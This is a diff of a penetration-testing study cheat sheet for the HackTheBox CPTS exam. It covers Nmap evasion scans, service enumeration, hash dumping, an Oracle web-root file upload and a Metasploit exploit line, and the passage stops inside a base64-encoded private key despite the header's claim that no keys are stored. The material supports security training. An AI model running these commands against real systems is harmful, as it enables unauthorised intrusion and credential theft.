@@ -1,98 +1,198 @@
-# CPTS-cheatsheet
-HackTheBox Certified Penetration Tester Specialist Cheatsheet
+# CPTS Cheat Sheet
 
+HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized, deduplicated, and sanitized.
 
-**Table of Contents**
-- [Tmux](#tmux)
-- [Nmap](#nmap)
-  - [Address Scanning](#nmap-address-scanning)
-  - [Scanning Techniques](#nmap-scanning-techniques)
-  - [Host Discovery](#nmap-host-discovery)
-  - [Port Scan](#nmap-port-scan)
-  - [OS and Service Detection](#nmap-os-and-service-detection)
-  - [Timing and Performance](#nmap-timing-and-performance)
+> **Source:** adapted from the CPTS cheatsheet. This branch (`oscp-cheatsheet`) keeps the same technical material in a consistent, study-friendly structure.
+>
+> **No credentials are stored in this document.** Passwords, hashes, keys, tokens, and session IDs have been replaced with placeholders such as `<PASSWORD>`, `<NTLM_HASH>`, and `<API_TOKEN>`.
+
+## Conventions
+
+- `A>` — command run on the attack host.
+- `V>` — command run on the victim/target host.
+- `<PLACEHOLDER>` — replace with the value for your engagement (IP, username, password, hash, etc.).
+- `#` — comment; commands are shown as they should be typed.
+- `crackmapexec`/`cme` examples keep their original name; the maintained fork is **NetExec** (`nxc`).
+
+## Table of Contents
+
+<details>
+<summary>Expand / collapse the full outline</summary>
+
+- [Conventions](#conventions)
+- [1. Tmux](#1-tmux)
+- [2. Nmap](#2-nmap)
+  - [Address Scanning](#address-scanning)
+  - [Scan Techniques](#scan-techniques)
+  - [Host Discovery](#host-discovery)
+  - [Port Scanning](#port-scanning)
+  - [OS & Service Detection](#os--service-detection)
+  - [Timing & Performance](#timing--performance)
   - [NSE Scripts](#nse-scripts)
-  - [Evasion and Spoofing](#firewall-evasion-and-spoofing)
+  - [Firewall Evasion & Spoofing](#firewall-evasion--spoofing)
   - [Output](#output)
-- [Footprinting Services](#footprinting-services)
-    - [Infrastructure-Based Enumeration](#infrastructure-based-enumeration) 
-    - [FTP](#ftp)
-    - [MSRPC-p135](#msrpc-p135)
-    - [SMB-p139,445](#smb-p139,445)
-    - [Rpcbind-p111](#rpcbind-p111)
-    - [NFS-p2049](#nfs-p2049)
-    - [DNS](#dns)
-    - [SMTP](#smtp)
-    - [IMAP POP3](#imap-pop3)
-    - [SNMP](#snmp)
-    - [MYSQL](#mysql)
-    - [MSSQL](#mssql)
-    - [Oracle-TNS](#oracle-tns)
-    - [IPMI](#ipmi)
-    - [Remote Management](#remote-management)
-- [Information Gathering Web Edition](#information-gathering-web-edition)
-- [File Transfers](#file-transfers)
-	- [Windows File Transfer](#windows-file-transfer)
-   	- [Linux File Transfer](#linux-file-transfer)
-   	- [Transferring Files with Code](#transferring-files-with-code)
-   	- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
-   	- [Protected File Transfers](#protected-file-transfers)
-   	- [Catching Files over HTTP/S](#catching-files-over-http/s)
-   	- [Living off The Land](#living-off-the-land)
-- [Shells](#shells)
-    - [Reverse Shell](#reverse-shell)
-    - [Bind Shell](#bind-shell)
-    - [Web Shell](#web-shell)
-    - [Updating TTY](#updating-tty)
-- [Password Attacks](#password-attacks)
-    - [Password Mutations](#password-mutations)
-    - [Remote Password Attacks](#remote-password-attacks)
-    - [Windows Password Attacks](#windows-password-attacks)
-    - [Linux Password Attacks](#linux-password-attacks)
-    - [Cracking Passwords](#cracking-passwords)
-- [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
-- [Attacking Common Services](#attacking-common-services)
-  	- [Attacking FTP](#attacking-ftp)
-    - [Attacking SMB](#attacking-smb)
-    - [Attacking SQL](#attacking-sql)
-    - [Attacking RDP](#attacking-rdp)
-    - [Attacking DNS](#attacking-dns)
-    - [Attacking Email Services](#attacking-email-services)
-- [Active Directory](#active-directory)
-    - [Initial Enumeration](#initial-enumeration)
-    - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
-    - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
-    - [Enumerating Disabling/Bypassing Security Controls](#enumerating-and-bypassing-security-controls)
-    - [Credentialed Enumeration - from Linux and Windows](credentialed-enumeration-from-linux-and-windows)
-    - [Living Of The Land](#living-of-the-land)
-    - [Kerberoasting](#kerberoasting)
-    - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
-    - [DCSync Attack](#dcsync-attack)
-    - [Miscellanous Configurations](#miscellanous-configurations)
-    - [ASREPRoasting](#asreproasting)
-    - [Trust Relationships](#trust-relationships-child-parent-trusts)
-- [Login Brute Forcing](#login-brute-forcing)
-    - [Hydra](#hydra)
-- [SQLMap](#sqlmap)
-- [Attacking Common Applications](#attacking-common-applications)
-  	- [Application Enumeration](#application-enumeration)
-  	- [WordPress](#wordpress)
-  	- [Joomla](#joomla)
-  	- [Drupal](#drupal)
-  	- [Tomcat](#tomcat)
-  	- [Splunk](#splunk)
-  	- [PRTG](#prtg)
-  	- [GITLAB](#gitlab)
-  	- [CGI](#cgi)
-  	- [ColdFusion](#coldFusion)
-  	- [IIS Tilde Enumeration](#iis-tilde-enumeration)
-  	- [LDAP](#ldap)
-  	- [Jenkins](#jenkins)
-- [Useful Resources](#useful-resources)
+- [3. Service Footprinting](#3-service-footprinting)
+  - [Infrastructure & OSINT Enumeration](#infrastructure--osint-enumeration)
+  - [FTP (21/tcp)](#ftp-21tcp)
+  - [MSRPC (135/tcp)](#msrpc-135tcp)
+  - [SMB (139, 445/tcp)](#smb-139-445tcp)
+  - [Rpcbind (111/tcp)](#rpcbind-111tcp)
+  - [NFS (2049/tcp)](#nfs-2049tcp)
+  - [DNS (53/tcp, 53/udp)](#dns-53tcp-53udp)
+  - [SMTP (25/tcp)](#smtp-25tcp)
+  - [IMAP & POP3 (143/993, 110/995/tcp)](#imap--pop3-143993-110995tcp)
+  - [SNMP (161/udp)](#snmp-161udp)
+  - [MySQL (3306/tcp)](#mysql-3306tcp)
+  - [MSSQL (1433/tcp)](#mssql-1433tcp)
+  - [Oracle TNS (1521/tcp)](#oracle-tns-1521tcp)
+  - [IPMI (623/udp)](#ipmi-623udp)
+  - [Remote Management](#remote-management)
+- [4. Web Reconnaissance](#4-web-reconnaissance)
+  - [WHOIS](#whois)
+  - [WhatWeb](#whatweb)
+  - [Virtual Hosts](#virtual-hosts)
+  - [Certificate Transparency (crt.sh)](#certificate-transparency-crtsh)
+  - [Banner Grabbing](#banner-grabbing)
+  - [WAF Detection](#waf-detection)
+  - [Nikto](#nikto)
+  - [ReconSpider](#reconspider)
+  - [Automated Reconnaissance](#automated-reconnaissance)
+- [5. File Transfers](#5-file-transfers)
+  - [Windows](#windows)
+    - [Download Operations](#download-operations)
+      - [PowerShell Base64](#powershell-base64)
+      - [PowerShell Web Downloads](#powershell-web-downloads)
+      - [SMB Downloads](#smb-downloads)
+      - [FTP Downloads](#ftp-downloads)
+    - [Upload Operations](#upload-operations)
+      - [PowerShell Base64](#powershell-base64-1)
+      - [PowerShell Web Uploads](#powershell-web-uploads)
+      - [SMB Uploads](#smb-uploads)
+      - [FTP Uploads](#ftp-uploads)
+  - [Linux](#linux)
+    - [Download Operations](#download-operations-1)
+      - [Base64](#base64)
+      - [Wget & cURL](#wget--curl)
+      - [Bash /dev/tcp](#bash-devtcp)
+      - [SSH Downloads](#ssh-downloads)
+    - [Upload Operations](#upload-operations-1)
+      - [HTTP Upload Server](#http-upload-server)
+      - [Alternative HTTP Servers](#alternative-http-servers)
+      - [SCP Upload](#scp-upload)
+  - [Transferring Files with Code](#transferring-files-with-code)
+    - [Python](#python)
+    - [PHP](#php)
+    - [Ruby](#ruby)
+    - [Perl](#perl)
+    - [JavaScript](#javascript)
+    - [VBScript](#vbscript)
+    - [Python 3 Upload](#python-3-upload)
+  - [Miscellaneous](#miscellaneous)
+    - [Netcat & Ncat](#netcat--ncat)
+      - [Forward File Transfer](#forward-file-transfer)
+      - [Reverse File Transfer](#reverse-file-transfer)
+    - [PowerShell Sessions](#powershell-sessions)
+    - [RDP Drive Redirection](#rdp-drive-redirection)
+  - [Protected File Transfers](#protected-file-transfers)
+    - [Windows Encryption](#windows-encryption)
+    - [Linux Encryption](#linux-encryption)
+  - [Receiving Files over HTTP/S](#receiving-files-over-https)
+    - [Nginx — Enabling PUT](#nginx--enabling-put)
+  - [Living off the Land](#living-off-the-land)
+    - [LOLBAS — Certreq Upload](#lolbas--certreq-upload)
+    - [GTFOBins — OpenSSL Download](#gtfobins--openssl-download)
+    - [Bitsadmin Download](#bitsadmin-download)
+    - [Certutil Download](#certutil-download)
+    - [GfxDownloadWrapper Download](#gfxdownloadwrapper-download)
+    - [WinHttpRequest (COM)](#winhttprequest-com)
+    - [Msxml2 (COM)](#msxml2-com)
+    - [BITS (COM)](#bits-com)
+- [6. Shells](#6-shells)
+  - [Reverse Shell](#reverse-shell)
+  - [Bind Shell](#bind-shell)
+  - [Web Shell](#web-shell)
+  - [TTY Upgrade](#tty-upgrade)
+- [7. Password Attacks](#7-password-attacks)
+  - [Password Mutations](#password-mutations)
+  - [Remote Password Attacks](#remote-password-attacks)
+  - [Windows Credential Harvesting](#windows-credential-harvesting)
+  - [Linux Credential Hunting](#linux-credential-hunting)
+  - [Cracking Passwords](#cracking-passwords)
+  - [Login Brute Forcing (Hydra)](#login-brute-forcing-hydra)
+- [8. Pivoting, Tunneling & Port Forwarding](#8-pivoting-tunneling--port-forwarding)
+  - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
+  - [SSH Dynamic Port Forwarding (SOCKS)](#ssh-dynamic-port-forwarding-socks)
+  - [SSH Remote/Reverse Port Forwarding](#ssh-remotereverse-port-forwarding)
+  - [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
+  - [Socat Redirection — Reverse Shell](#socat-redirection--reverse-shell)
+  - [Socat Redirection — Bind Shell](#socat-redirection--bind-shell)
+  - [Rpivot](#rpivot)
+  - [Windows netsh Port Proxy](#windows-netsh-port-proxy)
+  - [Dnscat2 DNS Tunneling](#dnscat2-dns-tunneling)
+  - [Chisel SOCKS5](#chisel-socks5)
+    - [Build and Serve](#build-and-serve)
+    - [Reverse SOCKS Proxy (Pivot as Server)](#reverse-socks-proxy-pivot-as-server)
+    - [Chisel Reverse Pivot (Attack Host as Server)](#chisel-reverse-pivot-attack-host-as-server)
+  - [ICMP Tunneling (ptunnel-ng)](#icmp-tunneling-ptunnel-ng)
+- [9. Attacking Common Services](#9-attacking-common-services)
+  - [FTP](#ftp)
+  - [SMB](#smb)
+  - [SQL (MySQL & MSSQL)](#sql-mysql--mssql)
+  - [RDP](#rdp)
+  - [DNS](#dns)
+  - [Email (SMTP & POP3)](#email-smtp--pop3)
+- [10. Active Directory](#10-active-directory)
+  - [Initial Enumeration](#initial-enumeration)
+  - [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
+  - [Password Spraying & Password Policy](#password-spraying--password-policy)
+  - [Enabling & Bypassing Security Controls](#enabling--bypassing-security-controls)
+  - [Credentialed Enumeration](#credentialed-enumeration)
+    - [From Linux](#from-linux)
+    - [From Windows](#from-windows)
+  - [Living off the Land (Windows)](#living-off-the-land-windows)
+    - [Basic Host Enumeration](#basic-host-enumeration)
+    - [PowerShell Enumeration](#powershell-enumeration)
+    - [Firewall & Defender Checks](#firewall--defender-checks)
+    - [Logged-on Users](#logged-on-users)
+    - [Network Information](#network-information)
+    - [WMI Enumeration](#wmi-enumeration)
+    - [Net Commands](#net-commands)
+    - [Dsquery](#dsquery)
+  - [Kerberoasting](#kerberoasting)
+  - [ACL Enumeration & Abuse](#acl-enumeration--abuse)
+  - [DCSync](#dcsync)
+  - [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
+  - [AS-REP Roasting](#as-rep-roasting)
+  - [Child → Parent Trusts (ExtraSids)](#child--parent-trusts-extrasids)
+    - [Enumeration](#enumeration)
+    - [ExtraSids — Mimikatz](#extrasids--mimikatz)
+    - [ExtraSids — Rubeus](#extrasids--rubeus)
+    - [DCSync from the Child Domain](#dcsync-from-the-child-domain)
+    - [From Linux (Impacket)](#from-linux-impacket)
+  - [Cross-Forest Trusts](#cross-forest-trusts)
+    - [From Windows](#from-windows-1)
+    - [From Linux](#from-linux-1)
+- [11. SQLMap](#11-sqlmap)
+- [12. Attacking Common Web Applications](#12-attacking-common-web-applications)
+  - [Application Enumeration](#application-enumeration)
+  - [WordPress](#wordpress)
+  - [Joomla](#joomla)
+  - [Drupal](#drupal)
+  - [Tomcat](#tomcat)
+  - [Splunk](#splunk)
+  - [PRTG](#prtg)
+  - [GitLab](#gitlab)
+  - [CGI](#cgi)
+  - [ColdFusion](#coldfusion)
+  - [IIS Tilde Enumeration](#iis-tilde-enumeration)
+  - [LDAP](#ldap)
+  - [Jenkins](#jenkins)
+- [13. Useful Resources](#13-useful-resources)
 
+</details>
 
+## 1. Tmux
 
-## [Tmux](https://tmuxcheatsheet.com/)
 ```
 # Start a new tmux session
 tmux new -s <name>
@@ -126,8 +226,10 @@ prefix + [Shift + "]
 prefix + [Shift + O]
 ```
 
-## [NMAP](https://www.stationx.net/nmap-cheat-sheet/)
-#### Nmap address scanning
+## 2. Nmap
+
+### Address Scanning
+
 ```
 # Scan a single IP
 nmap 192.168.1.1
@@ -141,7 +243,9 @@ nmap 192.168.1.1-254
 # Scan a subnet
 nmap 192.168.1.0/24
 ```
-#### Nmap scanning techniques
+
+### Scan Techniques
+
 ```
 # TCP SYN port scan (Default)
 nmap -sS 192.168.1.1
@@ -155,7 +259,9 @@ nmap -sU 192.168.1.1
 # TCP ACK port scan
 nmap  -sA 192.168.1.1
 ```
-#### Nmap Host Discovery
+
+### Host Discovery
+
 ```
 # Disable port scanning. Host discovery only.
 nmap -sn 192.168.1.1
@@ -168,10 +274,11 @@ nmap -n 192.168.1.1
 
 ```
 
-#### Nmap port scan
+### Port Scanning
+
 ```
 # Port scan from service name
-nmap 192.168.1.1 -p http, https
+nmap 192.168.1.1 -p http,https
 
 # Specific port scan
 nmap 192.168.1.1 -p 80,9001,22
@@ -183,28 +290,30 @@ nmap 192.168.1.1 -p-
 nmap -F 192.168.1.1
 
 # Scan top ports
-nmap 192.168.1.1 -top-ports 200
+nmap 192.168.1.1 --top-ports 200
 ```
 
-#### Nmap OS and service detection
+### OS & Service Detection
+
 ```
-# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
+# Aggressive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
 nmap -A 192.168.1.1
 
 # Version detection scanning
 nmap -sV 192.168.1.1
 
 # Version detection intensity from 0-9
-nmap -sV -version-intensity 7 192.168.1.1
+nmap -sV --version-intensity 7 192.168.1.1
 
-# OS detecion
+# OS detection
 nmap -O 192.168.1.1
 
 # Hard OS detection intensity
-nmap -O -osscan-guess 192.168.1.1
+nmap -O --osscan-guess 192.168.1.1
 ```
 
-#### Nmap timing and performance
+### Timing & Performance
+
 ```
 # Paranoid (0) Intrusion Detection System evasion
 nmap 192.168.1.1 -T0
@@ -215,7 +324,9 @@ nmap 192.168.1.1 -T5
 # Send packets no slower than <number> per second
 nmap 192.168.1.1 --min-rate 1000
 ```
-#### NSE Scripts
+
+### NSE Scripts
+
 ```
 # Scan with a single script. Example banner
 nmap 192.168.1.1 --script=banner
@@ -223,7 +334,9 @@ nmap 192.168.1.1 --script=banner
 # NSE script with arguments
 nmap 192.168.1.1 --script=banner --script-args <arguments>
 ```
-#### Firewall Evasion and Spoofing
+
+### Firewall Evasion & Spoofing
+
 ```
 # Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
 nmap -f 192.168.1.1
@@ -232,10 +345,10 @@ nmap -f 192.168.1.1
 nmap 192.168.1.1 --mtu 32
 
 # Send scans from spoofed IPs, or you can generate random 5 IPs via this option -D RND:5
-nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13
+nmap 192.168.1.1 -D 192.168.1.11,192.168.1.12,192.168.1.13
 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
 
-# -S 	Scans the target by using different source IP address | -O for operating system | -e to scan from specific eithernet
+# -S 	Scans the target by using different source IP address | -O for operating system | -e to scan from specific Ethernet
 sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
 
 # --source-port 53 	Performs the scans from specified source port | or You Can Connect To The Filtered Port
@@ -245,7 +358,9 @@ ncat -nv --source-port 53 10.129.2.28 50000 |or| nc -nv -p 53 10.129.2.47 50000
 # -sA 	Performs ACK scan on specified ports.
 sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
 ```
-#### Output
+
+### Output
+
 ```
 # Normal output to the file normal.file
 nmap 192.168.1.1 -oN scan.txt
@@ -253,16 +368,21 @@ nmap 192.168.1.1 -oN scan.txt
 # Output in the three major formats at once
 nmap 192.168.1.1 -oA scan
 ```
-## Footprinting Services
-##### Infrastructure-based Enumeration
+
+## 3. Service Footprinting
+
+### Infrastructure & OSINT Enumeration
+
 ```
-# Certificate transparency | to gather all subdomains for a corprate/company
+# Certificate transparency | to gather all subdomains for a corporate/company
 curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .
 
 # Scan each IP address in a list using Shodan.
 for i in $(cat ip-addresses.txt);do shodan host $i;done
 ```
-##### FTP
+
+### FTP (21/tcp)
+
 ```
 # Connect to FTP
 ftp <IP>
@@ -278,18 +398,22 @@ wget -m --no-passive ftp://anonymous:anonymous@<IP>
 sudo nmap --script-updatedb
 find / -type f -name ftp* 2>/dev/null | grep scripts
 
-# Using openssl, incase ftp use tls/sll
+# Using openssl, in case ftp use TLS/SSL
 openssl s_client -connect 10.129.14.136:21 -starttls ftp
 ```
-##### MSRPC-p135
+
+### MSRPC (135/tcp)
+
 ```
 nmap 10.11.1.111 --script=msrpc-enum
 msf > use exploit/windows/dcerpc/ms03_026_dcom
 ```
-##### SMB-p139,445
+
+### SMB (139, 445/tcp)
+
 ```
-# Connect to a specific SMB share | -L for display all files | and - N  for null session (-N), which is anonymous access 
-smbclient //<FQDN IP>/<share>
+# Connect to a specific SMB share | -L for display all files | and - N  for null session (-N), which is anonymous access
+smbclient //<FQDN/IP>/<share>
 
 # Interaction with the target using RPC | Query = `srvinfo` or `enumdomains` or `querydominfo` or `netshareenumall` or `netsharegetinfo <share>` or `enumdomusers` or `queryuser <RID>`
 rpcclient -U "" <FQDN IP>
@@ -307,9 +431,11 @@ smbmap -H 10.129.14.128
  ./enum4linux-ng.py 10.129.14.128 -A
 
 # Enumerating SMB shares using null session authentication.
-crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares
+crackmapexec smb <FQDN/IP> --shares -u '' -p ''
 ```
-##### Rpcbind-p111
+
+### Rpcbind (111/tcp)
+
 ```
 rpcinfo -p 10.11.1.111  # enum NFS shares
 showmount -e 10.11.1.111
@@ -324,7 +450,8 @@ rpcclient -U "" 10.11.1.111
 	netshareenumall
 ```
 
-##### NFS-p2049
+### NFS (2049/tcp)
+
 ```
 # Via nmap
  sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
@@ -337,7 +464,8 @@ mkdir target-NFS
 sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
 ```
 
-##### DNS
+### DNS (53/tcp, 53/udp)
+
 ```
 # NS request to the specific nameserver.
 dig ns <domain.tld> @<nameserver>
@@ -354,19 +482,19 @@ dig axfr <domain.tld> @<nameserver>
 > dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
 > dnsenum --enum inlanefreight.com -f /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --threads 20 --noreverse --nodnsserver --noreport --nocolor -r
 ```
-##### SMTP
-```
-# NS request to the specific nameserver. | `AUTH PLAIN` or `HELO` or `CONNECT 10.129.14.128:25 HTTP/1.0` when deling with proxy or `MAIL FROM` or `RCPT TO` or `DATA` or `RSET` or `VRFY` or `EXPN` or `NOOP` or `QUIT`
-telnet <ip> 25
 
-# Using Nmap - for Open Relay
-sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
+### SMTP (25/tcp)
+
+```
+# NS request to the specific nameserver. | `AUTH PLAIN` or `HELO` or `CONNECT 10.129.14.128:25 HTTP/1.0` when dealing with proxy or `MAIL FROM` or `RCPT TO` or `DATA` or `RSET` or `VRFY` or `EXPN` or `NOOP` or `QUIT`
+telnet <ip> 25
 
 # to enum a list of users
 smtp-user-enum -M VRFY -U /home/kali/Downloads/footprinting-wordlist.txt -t 10.129.152.94 -w 120 -p 25 -v
 ```
 
-##### IMAP POP3
+### IMAP & POP3 (143/993, 110/995/tcp)
+
 ```
 # Log in to the IMAPS service using cURL | `-k` or `-v`
 curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
@@ -374,11 +502,12 @@ curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
 # Connect to the IMAPS service | there are multiple IMAP Commands you need to search about it https://www.atmail.com/blog/imap-101-manual-imap-sessions/
 openssl s_client -connect <FQDN/IP>:imaps
 
-# Connect to the POP3s service | there are multiple IMAP Commands you need to search about it 
+# Connect to the POP3s service | there are multiple IMAP Commands you need to search about it
 openssl s_client -connect <FQDN/IP>:pop3s
 ```
 
-#### SNMP
+### SNMP (161/udp)
+
 ```
 # Querying OIDs using snmpwalk
 snmpwalk -v2c -c <community string> <FQDN/IP>
@@ -389,164 +518,219 @@ onesixtyone -c community-strings-fuzzing.list <FQDN/IP>
 # Bruteforcing SNMP service OIDs.
 braa <community string>@<FQDN/IP>:.1.*
 ```
-##### MYSQL
+
+### MySQL (3306/tcp)
+
 ```
 mysql -u <user> -p<password> -h <FQDN/IP>
 SELECT @@version_compile_os
 ```
-##### MSSQL
+
+### MSSQL (1433/tcp)
+
 ```
 impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
 mssqlclient.py -p 1433 julio@10.129.203.7
-sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 1>
-sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h     -----> this from linux
+sqlcmd -S SRVMSSQL -U julio -P '<PASSWORD>' -y 30 -Y 30
+sqsh -S 10.129.203.7 -U .\\julio -P '<PASSWORD>' -h   # Linux client
 
 ```
-##### Oracle-Tns
+
+### Oracle TNS (1521/tcp)
+
 ```
 # using nmap
 sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 
-# using odat tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. 
+# using odat tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
 ./odat.py all -s 10.129.204.235
 
-# using SQLplus - to Access/Log In | if you recieve an error go to https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
-sqlplus <username>/<pass>@IP/XE-as-an-instanse
-sqlplus <username>/<pass>@IP/XE-as-an-instanse as sysdba
+# using SQLplus - to Access/Log In | if you receive an error go to https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
+sqlplus <username>/<password>@<IP>/XE
+sqlplus <username>/<password>@<IP>/XE as sysdba
 
 # Oracle RDBMS - Interaction
 > select table_name from all_tables; | > select * from user_role_privs; | > select name, password from sys.user$;
 
 # Oracle RDBMS - File Upload
 echo "Oracle File Upload Test" > testing.txt
-./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P <PASSWORD> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 curl -X GET http://10.129.204.235/testing.txt
 ```
-##### IPMI
+
+### IPMI (623/udp)
+
 ```
 # Using nmap
 sudo nmap -sU --script ipmi-version -p 623 domain.local
 
 # IPMI version detection
-msf6 use auxiliary/scanner/ipmi/ipmi_version 
+msf6 use auxiliary/scanner/ipmi/ipmi_version
 
 # Dump IPMI hashes
-msf6 use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 use auxiliary/scanner/ipmi/ipmi_dumphashes
 ```
-##### Remote Management
-```
-# SSH -p22/TCP
-./ssh-audit.py <IP>
-ssh <user>@<FQDN/IP> -o PreferredAuthentications=password  --> Enforce password-based authentication
-ssh -i ./id_rsa <username>@<IP> --> Enforce Private-key-based authentication "chmod 600 ./id_rsa" 
 
-# Rsync -p873/TCP
+### Remote Management
+
+```bash
+# SSH (22/tcp)
+./ssh-audit.py <IP>
+ssh <user>@<FQDN/IP> -o PreferredAuthentications=password   # force password auth
+ssh -i ./id_rsa <username>@<IP>                              # force key auth; chmod 600 ./id_rsa first
+
+# Rsync (873/tcp)
 nc -nv 127.0.0.1 873
 rsync -av --list-only rsync://127.0.0.1/dev-folder
 
-# R-Services -p512/TCP,513/TCP,514/TCP
-rcp | rexec | rlogin | rsh | rstat | rwho | rusers -al
+# R-services (512, 513, 514/tcp)
+rcp
+rexec
+rlogin
+rsh
+rstat
+rwho
+rusers -al
 
-# RDP -p3389/TCP
+# RDP (3389/tcp)
 nmap -sV -sC <IP> -p3389 --script rdp*
 ./rdp-sec-check.pl <IP>
-xfreerdp /u:<username> /p:"<password>" /v:<IP> /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
+xfreerdp /u:<username> /p:"<password>" /v:<IP> /cert:ignore /dynamic-resolution /drive:share,<LOCAL_PATH>
 
-# WinRM -p5985/HTTP/TCP,5986/HTTPS/TCP
-For windows --> The Test-WsMan cmdlet is responsible for this
-For Linux   --> evil-winrm -i 10.129.201.248 -u <username> -p <password>
+# WinRM (5985 HTTP, 5986 HTTPS)
+# Windows: Test-WsMan
+evil-winrm -i 10.129.201.248 -u <username> -p <password>
 
-# WMI -p135/TCP
-/python3-impacket/examples/wmiexec.py username:"Password"@<IP> "hostname"
-
+# WMI (135/tcp)
+python3-impacket/examples/wmiexec.py username:"<PASSWORD>"@<IP> "hostname"
 ```
-## Information Gathering Web Edition
-##### WhoIs
+
+## 4. Web Reconnaissance
+
+### WHOIS
+
 ```
 whois inlanefreight.com
 ```
-##### WhatWeb
+
+### WhatWeb
+
 ```
 whatweb -a 3 http://dev.inlanefreight.local -v
 ```
-##### Virtual Hosts
+
+### Virtual Hosts
+
 ```
 gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
 ```
-##### crt.sh lookup
+
+### Certificate Transparency (crt.sh)
+
 ```
 curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
 ```
-##### Banner Grabbing 
+
+### Banner Grabbing
+
 ```
 you can use Wappalyzer,BuiltWith,WhatWeb,Nmap,Netcraft
 curl -I inlanefreight.com
 ```
-##### Web Application Firewalls (WAFs)
+
+### WAF Detection
+
 ```
 pip3 install git+https://github.com/EnableSecurity/wafw00f
 wafw00f inlanefreight.com
 ```
-##### nikto
+
+### Nikto
+
 ```
 nikto -h inlanefreight.com -Tuning b
 ```
-###### Reconspider
+
+### ReconSpider
+
 ```
 wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
 unzip ReconSpider.zip
 python3 ReconSpider.py http://inlanefreight.com
 ```
-###### Automate Reconnaissance
+
+### Automated Reconnaissance
+
 ```
 you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
 ```
-## File Transfers
-### Windows File Transfer
+
+## 5. File Transfers
+
+### Windows
+
 #### Download Operations
-##### PowerShell Base64 Encode & Decode
+
+##### PowerShell Base64
+
 ```
 A> md5sum id_rsa.txt
 A> cat id_rsa |base64 -w 0;echo
-V> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa.txt", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9Be